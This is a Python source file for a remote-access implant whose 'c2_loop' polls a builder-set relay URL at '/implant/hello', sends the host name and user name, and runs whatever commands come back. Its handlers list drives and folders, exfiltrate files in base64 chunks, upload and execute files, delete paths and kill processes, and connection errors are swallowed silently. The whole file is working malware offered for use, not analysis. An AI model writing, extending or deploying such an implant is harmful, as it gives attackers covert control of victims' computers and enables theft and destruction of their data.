import requests
import time
import threading
import subprocess
import uuid
import os
import platform
import socket
import shutil
import base64
import psutil
from datetime import datetime

# --- Configuration (to be replaced by builder) ---
RELAY_URL = "{{RELAY_URL}}"
POLL_INTERVAL_S = 5
SESSION_ID = str(uuid.uuid4())
CHUNK_SIZE = 1024 * 512 # 512 KB

# --- Core Action Handlers ---
def list_drives():
    """Lists all available drive letters."""
    drives = []
    if os.name == 'nt':
        import string
        for d in string.ascii_uppercase:
            if os.path.exists(f"{d}:\\"):
                drives.append(f"{d}:\\")
    else: # Basic support for Linux/macOS
        drives.append("/")
    return {"status": "success", "data": drives}

def list_directory(path):
    """Lists contents of a directory."""
    items = []
    for item in os.listdir(path):
        full_path = os.path.join(path, item)
        try:
            stat = os.stat(full_path)
            is_dir = os.path.isdir(full_path)
            items.append({
                "name": item,
                "type": "folder" if is_dir else "file",
                "size": stat.st_size,
                "modified": datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
            })
        except OSError:
            continue
    return {"status": "success", "data": {"path": path, "items": items}}

def download_file(path, chunk_num):
    """Reads a file chunk and encodes it for transfer."""
    with open(path, 'rb') as f:
        f.seek(chunk_num * CHUNK_SIZE)
        chunk_data = f.read(CHUNK_SIZE)
        is_last = len(chunk_data) < CHUNK_SIZE
        return {"status": "success", "data": {"chunk": base64.b64encode(chunk_data).decode(), "is_last": is_last}}

def upload_file(path, chunk, is_first):
    """Writes a received file chunk to disk."""
    if is_first and os.path.exists(path):
        os.remove(path)
    with open(path, 'ab') as f:
        f.write(base64.b64decode(chunk))
    return {"status": "success", "data": f"Chunk received for {os.path.basename(path)}"}

def delete_path(path):
    """Deletes a file or an entire directory."""
    if os.path.isdir(path):
        shutil.rmtree(path)
    else:
        os.remove(path)
    return {"status": "success", "data": f"Deleted: {path}"}

def rename_path(old_path, new_path):
    """Renames a file or directory."""
    os.rename(old_path, new_path)
    return {"status": "success", "data": f"Renamed to: {os.path.basename(new_path)}"}

def new_folder(path):
    """Creates a new directory."""
    os.makedirs(path, exist_ok=True)
    return {"status": "success", "data": f"Created folder: {os.path.basename(path)}"}

def execute_file(path):
    """Executes a file using the OS's default handler."""
    os.startfile(path)
    return {"status": "success", "data": f"Executed: {os.path.basename(path)}"}

def list_processes():
    """Lists all running processes."""
    processes = []
    for p in psutil.process_iter(['pid', 'name', 'username', 'memory_info']):
        try:
            pinfo = p.info
            # Convert RSS memory to MB
            pinfo['memory_mb'] = pinfo['memory_info'].rss / (1024 * 1024) if pinfo.get('memory_info') else 0
            processes.append(pinfo)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return {"status": "success", "data": sorted(processes, key=lambda p: p['name'].lower())}

def kill_process(pid):
    """Terminates a process by its PID."""
    psutil.Process(pid).kill()
    return {"status": "success", "data": f"Process {pid} killed."}


# --- Command Dispatcher ---
def execute_command(command_data):
    """Parses command and calls the appropriate handler."""
    action = command_data.get('action')
    params = command_data.get('params', {})
    result = {"status": "error", "data": "Unsupported action"}
    
    try:
        if action == 'list_drives':
            result = list_drives()
        elif action == 'list_directory':
            result = list_directory(**params)
        elif action == 'download_file':
            result = download_file(**params)
        elif action == 'upload_file':
            result = upload_file(**params)
        elif action == 'delete_path':
            result = delete_path(**params)
        elif action == 'rename_path':
            result = rename_path(**params)
        elif action == 'new_folder':
            result = new_folder(**params)
        elif action == 'execute_file':
            result = execute_file(**params)
        elif action == 'list_processes':
            result = list_processes()
        elif action == 'kill_process':
            result = kill_process(**params)
            
    except Exception as e:
        result = {"status": "error", "data": str(e)}

    return result

# --- Main Communication Loop ---
def c2_loop():
    """The main loop that communicates with the relay server."""
    while True:
        try:
            # Prepare hello packet with system info
            payload = {
                "session_id": SESSION_ID,
                "hostname": socket.gethostname(),
                "user": os.getlogin()
            }
            
            # Send hello and get commands
            response = requests.post(f"{RELAY_URL}/implant/hello", json=payload, timeout=10)
            
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for cmd in commands:
                    # Execute each command and post the result
                    result_data = execute_command(cmd)
                    response_payload = {
                        "session_id": SESSION_ID,
                        "response_id": cmd.get('response_id'),
                        "original_action": cmd.get('action'),
                        "result": result_data
                    }
                    requests.post(f"{RELAY_URL}/implant/response", json=response_payload, timeout=10)

        except requests.exceptions.RequestException:
            # Fail silently on connection errors and retry later
            pass
        except Exception:
            # Catch any other exceptions during execution
            pass
            
        time.sleep(POLL_INTERVAL_S)

# --- Entry Point ---
if __name__ == "__main__":
    # Run the main C2 loop in a separate thread
    c2_thread = threading.Thread(target=c2_loop, daemon=True)
    c2_thread.start()
    
    # Keep the main thread alive indefinitely
    while True:
        time.sleep(60)